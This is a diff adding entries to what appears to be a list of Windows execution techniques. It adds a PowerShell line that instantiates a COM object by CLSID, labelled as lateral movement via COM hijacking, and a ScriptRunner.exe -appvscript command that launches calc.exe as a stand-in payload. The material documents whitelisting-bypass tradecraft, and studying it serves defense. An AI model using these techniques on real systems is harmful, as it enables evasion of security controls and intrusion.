@@ -92,7 +92,16 @@ https://gist.githubusercontent.com/homjxi0e/eb16d75f3db6d6081648f2c5c5c98c3b/raw
 forfiles.exe /c calc.exe
 
 ```
+( 10v4 ) Lateral Movement Using COM Object Hijacking 
+```
+ $COMEx = [Activator]::CreateInstance([type]::GetTypeFromCLSID("{00000001-0000-0000-0000-0000FEEDACDC} "))
+ https://gist.github.com/homjxi0e/95aeb250b5290b27804cbe983af91085
+```
 
+( 10v5 )ScriptRunner.exe Execution 
+```
+ScriptRunner.exe -appvscript C:\Windows\System32\calc.exe
+```
 
 (Note) Product Via @bohops 
 
